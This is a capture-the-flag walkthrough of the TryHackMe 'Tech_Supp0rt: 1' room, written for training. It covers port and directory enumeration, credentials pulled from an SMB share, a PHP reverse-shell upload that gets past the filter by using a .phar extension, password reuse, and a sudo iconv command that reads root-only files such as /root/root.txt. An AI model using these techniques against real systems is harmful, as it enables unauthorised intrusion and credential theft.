---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Tech_Supp0rt: 1
# DESCRIPTION       . Hack into the scammer's under-development website to foil their plans.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/techsupp0rt1
```

```
sudo nmap -sSVC -T5 -p- 10.10.49.184 -oN tech
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 108af572d7f97e14a5c54f9e978b3d58 (RSA)
|   256 7f10f557413c71dbb55bdb75c976305c (ECDSA)
|_  256 6b4c23506f36007ca67c1173c1a8600c (ED25519)

80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-12-19T14:22:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-12-19T19:52:50+05:30
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
```

#### PORT 80

- The site defaults to the apache default site and the source code doesn't reveal anything useful.

- I decided to fuzz around a bit and found the following

```
fuff -u http://10.10.49.184/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100
```

```
phpinfo.php             [Status: 200, Size: 94963, Words: 4707, Lines: 1165]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
test                    [Status: 301, Size: 311, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10]
```

- `/test` is just a scammer-like website replica of microsoft.com that has a lot of popups and flashes on the screen.

- The source code did not reveal anything of interest, and fuzzing it further yield no result. 

- Fuzzing `/wordpress` directory on the other hand, reveals the existence of `wp-admin`, `wp-content`, `wp-include` and `xmlrpc.php` pages.

- I tried bruteforcing for the `admin` user but it didn't work. So I decided to look into ports 139 and 445 for now.

#### PORTS 139 & 445

- Using `smbclient -L 10.10.49.184` reveals the `websvr` share. 
- We can access it using `smbclient \\\\10.10.49.184\websvr` 

- The share holds the `enter.txt` file which reveals the following information

```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:{REDACTED} [cooked with magical formula]
Wordpress creds
|->
```

- The wordpress credentials are missing, and the ones for subrion aren't working for either SSH or Wordpress.

- Alright. So we know there should be an endpoint called `subrion`. 


#### FOOTHOLD

- If we navigate to `http://10.10.49.184/subrion` we get a `timed out` with the address `http://10.0.2.15/subrion/subrion/`. 

- I decided to turn on burp suite and take a look around. The initial request is the one below, and, if we forward this, we end up with the second request, which is invalid, as the second directory does not exist.

```
GET /subrion HTTP/1.1
Host: 10.10.49.184
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: INTELLI_06c8042c3d=738fi7fgbi3ntave916q9dtf7i
Connection: close
```

```
GET /subrion/subrion/ HTTP/1.1
Host: 10.0.2.15
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- However, after some googling, I found [this](https://github.com/intelliants/subrion). Subrion is a PHP CMS, and, as we can see in the repository, should have `robots.txt`.

- I reloaded the page so I can capture the first request again and added `/robots.txt` after `/subrion`.

```
GET /subrion/robots.txt HTTP/1.1
Host: 10.10.49.184
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: INTELLI_06c8042c3d=738fi7fgbi3ntave916q9dtf7i
Connection: close
```

- If we redirect this, then we're getting shown the content of `/robots.txt` file.

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

- Subrion login panel can be accessed by modifying the `GET request` to `GET /subrion/panel/`.

- The hash found in the `enter.txt` file (in SMB share) can be decoded using the following sequence: `From Base58` -> `From Base32` -> `From Base64`. 

- Alternatively, you can use the `Magic` formula on [cyberchef](https://cyberchef.org/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)From_Base32('A-Z2-7%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=N3NLdm50WGRQRUpheGF6Y2U5UFhpMjR6YUZyTGlLV0Nr)

- I spent a while looking around the CMS to see what I can do. 

- As a side note, I completed the second requirement on the scammer's To-Do list. We can "fix" the `/subrion` directory by going to `System -> System` and setting the `Site URL` to `http://machine_ip/subrion`. 

- This will help us too, since we can use a regular browser and skip modifying requests if we want to access the panel later.

- Anyway. I found the `Content -> Uploads` page. I tried uploading the `enter.txt` file and, when I opened it, I was redirected to `/uploads/enter.txt`.

- So I tried uploading a reverse shell called `shell.php`, and then I went to `/uploads/shell.php`. However, I got `Forbidden. You don't have permission to access this resource.`

- This made me think that maybe this is a filter for `.php` files to avoid exactly this, uploading malicious files. So I've changed the file extension to `.phar` and uploaded it using the same method.

- This time, going to `/uploads/shell.phar` allows us to catch a revese shell (assuming we already have the listener running) as `www-data`. 

- The first thing I did after checking the basics (SUID, writable paths, capabilities, home directories, cron jobs, etc) was to check the `wp-config.php` file located in `/var/www/html/wordpress` 

```
/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'I{redacted}!' );
```

- I tried using these credentials for `mysql` in order to dump the `wp_users` table, but I kept getting `bash: !123: event not found` and I assumed this was because my reverse shell stabilisation is a bit bugged this time.

- Anyway, before googling to find a fix for the problem, I took a look at `/etc/passwd` and I was that the user `support` is not even created on the system, so I tried the password with `scamsite` user.

- It worked and upon checking `sudo -l` for `scamsite`, I noticed that this user has access to run `/usr/bin/iconv` as sudo, which, according to GTFObins, allows us to read from files with higher privileges.

```
LFILE=/root/root.txt

sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
```

- You can techinically read `/etc/shadow` to get the root hash and try to crack that, but I assume it's not the intended way so it probably would take a lot of time.

